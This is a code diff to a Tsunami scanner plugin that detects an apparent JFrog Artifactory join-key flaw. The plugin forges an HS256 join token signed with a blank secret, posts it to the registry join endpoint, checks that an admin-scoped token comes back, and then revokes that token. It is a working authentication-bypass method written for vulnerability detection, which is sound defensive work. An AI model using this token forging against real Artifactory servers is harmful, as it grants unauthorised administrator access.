@@ -17,13 +17,20 @@ package com.google.tsunami.plugins.detectors.cves.cve202682329;
 
 import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.common.collect.ImmutableList.toImmutableList;
+import static com.google.common.net.HttpHeaders.ACCEPT;
+import static com.google.common.net.HttpHeaders.AUTHORIZATION;
 import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
-import static com.google.common.net.HttpHeaders.USER_AGENT;
+import static com.google.common.net.HttpHeaders.LOCATION;
+import static com.google.tsunami.common.net.http.HttpRequest.delete;
 import static com.google.tsunami.common.net.http.HttpRequest.post;
 import static java.nio.charset.StandardCharsets.UTF_8;
 
 import com.google.common.annotations.VisibleForTesting;
+import com.google.common.base.Ascii;
+import com.google.common.base.CharMatcher;
+import com.google.common.base.Splitter;
 import com.google.common.collect.ImmutableList;
+import com.google.common.collect.ImmutableSet;
 import com.google.common.flogger.GoogleLogger;
 import com.google.gson.JsonElement;
 import com.google.gson.JsonObject;
@@ -31,6 +38,7 @@ import com.google.gson.JsonParser;
 import com.google.gson.JsonSyntaxException;
 import com.google.protobuf.ByteString;
 import com.google.protobuf.util.Timestamps;
+import com.google.tsunami.common.data.NetworkEndpointUtils;
 import com.google.tsunami.common.data.NetworkServiceUtils;
 import com.google.tsunami.common.net.http.HttpClient;
 import com.google.tsunami.common.net.http.HttpHeaders;
@@ -39,6 +47,7 @@ import com.google.tsunami.common.net.http.HttpResponse;
 import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
+import com.google.tsunami.plugin.annotations.ForServiceName;
 import com.google.tsunami.plugin.annotations.ForWebService;
 import com.google.tsunami.plugin.annotations.PluginInfo;
 import com.google.tsunami.proto.DetectionReport;
@@ -47,14 +56,19 @@ import com.google.tsunami.proto.DetectionStatus;
 import com.google.tsunami.proto.NetworkService;
 import com.google.tsunami.proto.Severity;
 import com.google.tsunami.proto.TargetInfo;
+import com.google.tsunami.proto.TransportProtocol;
 import com.google.tsunami.proto.Vulnerability;
 import com.google.tsunami.proto.VulnerabilityId;
 import java.io.IOException;
+import java.net.URI;
+import java.net.URISyntaxException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 import java.time.Clock;
-import java.time.Instant;
 import java.util.Base64;
+import java.util.List;
+import java.util.Optional;
+import java.util.UUID;
 import javax.crypto.Mac;
 import javax.crypto.spec.SecretKeySpec;
 import javax.inject.Inject;
@@ -63,11 +77,22 @@ import javax.inject.Inject;
 @PluginInfo(
     type = PluginType.VULN_DETECTION,
     name = "Cve202682329VulnDetector",
-    version = "0.1",
+    version = "0.2",
     description = Cve202682329VulnDetector.VULN_DESCRIPTION,
     author = "Tsunami Security Scanner Community",
     bootstrapModule = Cve202682329DetectorBootstrapModule.class)
 @ForWebService
+@ForServiceName({
+  "blackice-alerts",
+  "blackice-icecap",
+  "https-alt",
+  "ssl/blackice-alerts",
+  "ssl/blackice-icecap",
+  "ssl/https-alt",
+  "ssl/unknown",
+  "tcpwrapped",
+  "unknown"
+})
 public final class Cve202682329VulnDetector implements VulnDetector {
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
 
@@ -87,15 +112,33 @@ public final class Cve202682329VulnDetector implements VulnDetector {
       "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";
 
   @VisibleForTesting
-  static final byte[] blankSecret = {
+  static final String INVALID_KID = "non-existent-kid";
+
+  @VisibleForTesting static final String EXPECTED_SECURE_ALG = "RS256";
+
+  // Base64URL prefix for {"alg":"RS256"...} in standard JFrog Access federated admin JWTs.
+  @VisibleForTesting static final String RS256_HEADER_PREFIX = "eyJhbGciOiJSUzI1NiI";
+
+  private static final byte[] blankSecret = {
     0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
     0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
     0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
     0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20
   };
 
+  @VisibleForTesting
+  static final byte[] invalidSecret = {
+    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
+    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
+    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
+    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41
+  };
+
+  private static final String JOIN_ENDPOINT_PATH = "access/api/v1/registry/join";
+  private static final String REVOKE_TOKEN_PATH = "/access/api/v1/tokens/me";
+
   private static final ImmutableList<String> VULNERABLE_PATHS =
-      ImmutableList.of("access/api/v1/registry/join", "artifactory/access/api/v1/registry/join");
+      ImmutableList.of(JOIN_ENDPOINT_PATH, "artifactory/" + JOIN_ENDPOINT_PATH);
 
   private final HttpClient httpClient;
   private final Clock utcClock;
@@ -114,7 +157,7 @@ public final class Cve202682329VulnDetector implements VulnDetector {
     return DetectionReportList.newBuilder()
         .addAllDetectionReports(
             matchedServices.stream()
-                .filter(NetworkServiceUtils::isWebService)
+                .filter(Cve202682329VulnDetector::isCandidateService)
                 .filter(this::isServiceVulnerable)
                 .map(networkService -> buildDetectionReport(targetInfo, networkService))
                 .collect(toImmutableList()))
@@ -139,48 +182,216 @@ public final class Cve202682329VulnDetector implements VulnDetector {
             .setRecommendation(
                 "Upgrade JFrog Artifactory to the patched version corresponding to your release"
                     + " branch (7.111.21, 7.117.28, 7.125.20, 7.133.29, 7.146.38, 7.161.20, or"
-                    + " later). As temporary mitigations, configure an explicit non-empty joinKey"
-                    + " and restrict network access to the /access/api/v1/registry/** endpoints.")
+                    + " later). As temporary mitigations, configure an explicit non-empty"
+                    + " shared.security.additionalJoinKeys value and restrict network access to the"
+                    + " /access/api/v1/registry/** endpoints.")
             .build());
   }
 
-  private boolean isServiceVulnerable(NetworkService networkService) {
-    String baseUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
-    String forgedJwt = forgeJoinJwt(Instant.now(utcClock).getEpochSecond(), "tsunami@scanner");
+  private static final ImmutableSet<String> DIRECT_CANDIDATE_SERVICES =
+      ImmutableSet.of(
+          "blackice-alerts",
+          "blackice-icecap",
+          "https-alt",
+          "ssl/blackice-alerts",
+          "ssl/blackice-icecap",
+          "ssl/https-alt",
+          "ssl/unknown");
 
-    for (String path : VULNERABLE_PATHS) {
-      String targetUrl = baseUrl + path;
-      try {
-        HttpRequest httpRequest =
-            post(targetUrl)
-                .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "text/plain").build())
-                .setRequestBody(ByteString.copyFromUtf8(forgedJwt))
-                .build();
-        HttpResponse httpResponse = httpClient.send(httpRequest, networkService);
-        if ((httpResponse.status().code() == 200 || httpResponse.status().code() == 201)
-            && httpResponse.bodyString().isPresent()
-            && isSuccessfulJoinResponse(httpResponse.bodyString().get())) {
-          return true;
+  @VisibleForTesting
+  static boolean isCandidateService(NetworkService networkService) {
+    TransportProtocol protocol = networkService.getTransportProtocol();
+    if (protocol != TransportProtocol.TRANSPORT_PROTOCOL_UNSPECIFIED
+        && protocol != TransportProtocol.TCP) {
+      return false;
+    }
+    if (NetworkServiceUtils.isWebService(networkService)) {
+      return true;
+    }
+    String serviceName = Ascii.toLowerCase(networkService.getServiceName().trim());
+    if (DIRECT_CANDIDATE_SERVICES.contains(serviceName)) {
+      return true;
+    }
+    int port = networkService.getNetworkEndpoint().getPort().getPortNumber();
+    return port == 8081 || port == 8082 || port == 8443;
+  }
+
+  @VisibleForTesting
+  static ImmutableSet<String> buildCandidateBaseUrls(NetworkService networkService) {
+    if (!NetworkServiceUtils.isWebService(networkService)) {
+      String authority = NetworkEndpointUtils.toUriAuthority(networkService.getNetworkEndpoint());
+      if (networkService.getSupportedSslVersionsCount() > 0) {
+        return ImmutableSet.of("https://" + authority + "/", "http://" + authority + "/");
+      }
+      return ImmutableSet.of("http://" + authority + "/");
+    }
+    String originRootUrl =
+        NetworkServiceUtils.buildWebApplicationRootUrl(
+            networkService.toBuilder().clearServiceContext().build());
+    String appRootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
+    return ImmutableSet.of(originRootUrl, appRootUrl);
+  }
+
+  private boolean isServiceVulnerable(NetworkService networkService) {
+    String failedScheme = null;
+    for (String baseUrl : buildCandidateBaseUrls(networkService)) {
+      String scheme = baseUrl.startsWith("https://") ? "https://" : "http://";
+      if (scheme.equals(failedScheme)) {
+        continue;
+      }
+      for (String path : VULNERABLE_PATHS) {
+        String targetUrl = baseUrl + path;
+        try {
+          if (probeEndpoint(targetUrl, networkService)) {
+            return true;
+          }
+        } catch (IOException e) {
+          logger.atWarning().withCause(e).log(
+              "Request to target %s failed on %s; skipping remaining %s paths",
+              networkService, baseUrl, scheme); // NOMUTANTS -- diagnostic logging
+          failedScheme = scheme;
+          break;
         }
-      } catch (IOException e) {
-        logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
       }
     }
     return false;
   }
 
+  private boolean probeEndpoint(String targetUrl, NetworkService networkService)
+      throws IOException {
+    // Mint fresh join tokens per endpoint attempt with a unique per-request service_id so
+    // preceding transport timeouts never push iat past JFrog Access's 30-second window.
+    long issuedAtEpochSeconds = utcClock.instant().getEpochSecond();
+    String serviceId = "jfrt@01tsunami-" + UUID.randomUUID();
+
+    // Negative control first: confirm that an unrecognized join key ID ("non-existent-kid") is
+    // rejected so permissive/echo servers short-circuit without minting a token.
+    String negativeJwt = forgeJoinJwt(issuedAtEpochSeconds, serviceId, INVALID_KID, invalidSecret);
+    HttpResponse negativeResponse = sendJoinRequest(targetUrl, negativeJwt, networkService);
+    if (isSuccessfulHttpStatus(negativeResponse.status().code())
+        && isSuccessfulJoinResponse(
+            negativeResponse.bodyString().orElse(""), negativeJwt, serviceId)) {
+      logger.atFine().log(
+          "Target %s accepted negative-control join key; ignoring false positive.",
+          targetUrl); // NOMUTANTS -- diagnostic logging
+      return false;
+    }
+
+    String positiveJwt = forgeJoinJwt(issuedAtEpochSeconds, serviceId, BLANK_KID, blankSecret);
+    HttpResponse positiveResponse = sendJoinRequest(targetUrl, positiveJwt, networkService);
+    if (!isSuccessfulHttpStatus(positiveResponse.status().code())) {
+      return false;
+    }
+    Optional<String> issuedToken =
+        extractValidAdminJwt(positiveResponse.bodyString().orElse(""), positiveJwt, serviceId);
+    if (issuedToken.isEmpty()) {
+      return false;
+    }
+    try {
+      return true;
+    } finally {
+      revokeMintedToken(targetUrl, issuedToken.get(), networkService);
+    }
+  }
+
+  private void revokeMintedToken(
+      String joinEndpointUrl, String issuedToken, NetworkService networkService) {
+    String revokeUrl =
+        joinEndpointUrl.substring(0, joinEndpointUrl.length() - JOIN_ENDPOINT_PATH.length() - 1)
+            + REVOKE_TOKEN_PATH;
+    HttpRequest revokeRequest =
+        delete(revokeUrl)
+            .setHeaders(
+                HttpHeaders.builder().addHeader(AUTHORIZATION, "Bearer " + issuedToken).build())
+            .build();
+    try {
+      httpClient.send(revokeRequest, networkService);
+    } catch (IOException e) {
+      logger.atFine().withCause(e).log(
+          "Best-effort token self-revocation to %s failed.",
+          revokeUrl); // NOMUTANTS -- diagnostic logging
+    }
+  }
+
+  private HttpResponse sendJoinRequest(
+      String targetUrl, String jwtPayload, NetworkService networkService) throws IOException {
+    HttpResponse response = executePost(targetUrl, jwtPayload, networkService);
+    if (isRedirectStatus(response.status().code())) {
+      Optional<String> location = response.headers().get(LOCATION);
+      if (location.isPresent()) {
+        Optional<String> redirectUrl = resolveSameHostRedirectUrl(targetUrl, location.get());
+        if (redirectUrl.isPresent()) {
+          return executePost(redirectUrl.get(), jwtPayload, networkService);
+        }
+      }
+    }
+    return response;
+  }
+
+  private HttpResponse executePost(
+      String targetUrl, String jwtPayload, NetworkService networkService) throws IOException {
+    HttpRequest httpRequest =
+        post(targetUrl)
+            .setHeaders(
+                HttpHeaders.builder()
+                    .addHeader(CONTENT_TYPE, "text/plain")
+                    .addHeader(ACCEPT, "application/json")
+                    .build())
+            .setRequestBody(ByteString.copyFromUtf8(jwtPayload))
+            .build();
+    return httpClient.send(httpRequest, networkService);
+  }
+
+  private static boolean isSuccessfulHttpStatus(int statusCode) {
+    return statusCode == 200 || statusCode == 201;
+  }
+
+  private static boolean isRedirectStatus(int statusCode) {
+    return statusCode == 301 || statusCode == 302 || statusCode == 307 || statusCode == 308;
+  }
+
+  @VisibleForTesting
+  static Optional<String> resolveSameHostRedirectUrl(String targetUrl, String location) {
+    try {
+      URI baseUri = new URI(targetUrl);
+      URI resolvedUri = baseUri.resolve(location.trim());
+      String scheme = resolvedUri.getScheme();
+      String host = resolvedUri.getHost();
+      String path = resolvedUri.getPath();
+      if (scheme == null
+          || (!Ascii.equalsIgnoreCase(scheme, "http") && !Ascii.equalsIgnoreCase(scheme, "https"))
+          || host == null
+          || !Ascii.equalsIgnoreCase(host, baseUri.getHost())
+          || path == null
+          || !path.endsWith("/" + JOIN_ENDPOINT_PATH)) {
+        return Optional.empty();
+      }
+      String resolvedString = resolvedUri.toString();
+      return resolvedString.equals(targetUrl) ? Optional.empty() : Optional.of(resolvedString);
+    } catch (IllegalArgumentException | URISyntaxException e) {
+      logger.atFine().withCause(e).log(
+          "Ignoring invalid redirect location: %s", location); // NOMUTANTS -- diagnostic logging
+      return Optional.empty();
+    }
+  }
+
   @VisibleForTesting
   static String forgeJoinJwt(long epochSeconds, String serviceId) {
+    return forgeJoinJwt(epochSeconds, serviceId, BLANK_KID, blankSecret);
+  }
+
+  @VisibleForTesting
+  static String forgeJoinJwt(long epochSeconds, String serviceId, String keyId, byte[] secret) {
     String headerJson = "{\"alg\":\"HS256\",\"typ\":\"JWT\"}";
     String payloadJson =
         String.format(
             "{\"iat\":%d,\"service_id\":\"%s\",\"kid\":\"%s\",\"skip_node_registration\":true}",
-            epochSeconds, serviceId, BLANK_KID);
+            epochSeconds, serviceId, keyId);
 
     String signingInput = base64UrlEncode(headerJson) + "." + base64UrlEncode(payloadJson);
     try {
       Mac mac = Mac.getInstance("HmacSHA256");
-      mac.init(new SecretKeySpec(blankSecret, "HmacSHA256"));
+      mac.init(new SecretKeySpec(secret, "HmacSHA256"));
       byte[] signature = mac.doFinal(signingInput.getBytes(UTF_8));
       return signingInput + "." + base64UrlEncode(signature);
     } catch (NoSuchAlgorithmException | InvalidKeyException e) {
@@ -196,17 +407,83 @@ public final class Cve202682329VulnDetector implements VulnDetector {
     return Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
   }
 
-  private static boolean isSuccessfulJoinResponse(String body) {
+  @VisibleForTesting
+  static boolean isSuccessfulJoinResponse(String body, String sentToken, String expectedSubject) {
+    return extractValidAdminJwt(body, sentToken, expectedSubject).isPresent();
+  }
+
+  private static Optional<String> extractValidAdminJwt(
+      String body, String sentToken, String expectedSubject) {
     try {
       JsonElement jsonElement = JsonParser.parseString(body);
-      if (jsonElement.isJsonObject()) {
-        JsonObject jsonObject = jsonElement.getAsJsonObject();
-        return jsonObject.has("token")
-            && jsonObject.get("token").isJsonPrimitive()
-            && !jsonObject.get("token").getAsString().isEmpty();
+      if (!jsonElement.isJsonObject()) {
+        return Optional.empty();
       }
+      JsonObject jsonObject = jsonElement.getAsJsonObject();
+      if (!jsonObject.has("token") || !jsonObject.get("token").isJsonPrimitive()) {
+        return Optional.empty();
+      }
+      String issuedToken = jsonObject.get("token").getAsString();
+      if (issuedToken.isEmpty() || issuedToken.equals(sentToken)) {
+        return Optional.empty();
+      }
+      return isValidAdminJwt(issuedToken, expectedSubject)
+          ? Optional.of(issuedToken)
+          : Optional.empty();
     } catch (JsonSyntaxException e) {
-      logger.atFine().withCause(e).log("Failed to parse JSON response: %s", body);
+      logger.atFine().withCause(e).log(
+          "Failed to parse JSON response: %s", body); // NOMUTANTS -- diagnostic logging
+      return Optional.empty();
+    }
+  }
+
+  private static boolean isValidAdminJwt(String token, String expectedSubject) {
+    List<String> parts = Splitter.on('.').splitToList(token);
+    if (parts.size() != 3 || parts.get(2).isEmpty()) {
+      return false;
+    }
+    try {
+      String headerJson = new String(Base64.getUrlDecoder().decode(parts.get(0)), UTF_8);
+      String claimsJson = new String(Base64.getUrlDecoder().decode(parts.get(1)), UTF_8);
+      JsonElement headerEl = JsonParser.parseString(headerJson);
+      JsonElement claimsEl = JsonParser.parseString(claimsJson);
+      if (!headerEl.isJsonObject() || !claimsEl.isJsonObject()) {
+        return false;
+      }
+      JsonObject headerObj = headerEl.getAsJsonObject();
+      if (!headerObj.has("alg") || !headerObj.get("alg").isJsonPrimitive()) {
+        return false;
+      }
+      String alg = headerObj.get("alg").getAsString().trim();
+      if (!Ascii.equalsIgnoreCase(alg, EXPECTED_SECURE_ALG)) {
+        return false;
+      }
+      JsonObject claimsObj = claimsEl.getAsJsonObject();
+      if (!claimsObj.has("sub")
+          || !claimsObj.get("sub").isJsonPrimitive()
+          || !claimsObj.get("sub").getAsString().equals(expectedSubject)) {
+        return false;
+      }
+      if (!claimsObj.has("scp") || !claimsObj.get("scp").isJsonPrimitive()) {
+        return false;
+      }
+      return hasAdminScope(claimsObj.get("scp").getAsString());
+    } catch (IllegalArgumentException | JsonSyntaxException e) {
+      logger.atFine().withCause(e).log(
+          "Failed to decode issued JWT: %s", token); // NOMUTANTS -- diagnostic logging
+      return false;
+    }
+  }
+
+  private static boolean hasAdminScope(String scopeValue) {
+    for (String token :
+        Splitter.on(CharMatcher.whitespace()).omitEmptyStrings().split(scopeValue)) {
+      if (token.equals("admin")
+          || token.equals("applied-permissions/admin")
+          || token.startsWith("applied-permissions/admin:")
+          || token.equals("system:federation:admin")) {
+        return true;
+      }
     }
     return false;
   }
@@ -216,7 +493,7 @@ public final class Cve202682329VulnDetector implements VulnDetector {
     return DetectionReport.newBuilder()
         .setTargetInfo(targetInfo)
         .setNetworkService(vulnerableNetworkService)
-        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
+        .setDetectionTimestamp(Timestamps.fromMillis(utcClock.instant().toEpochMilli()))
         .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
         .setVulnerability(this.getAdvisories().get(0))
         .build();
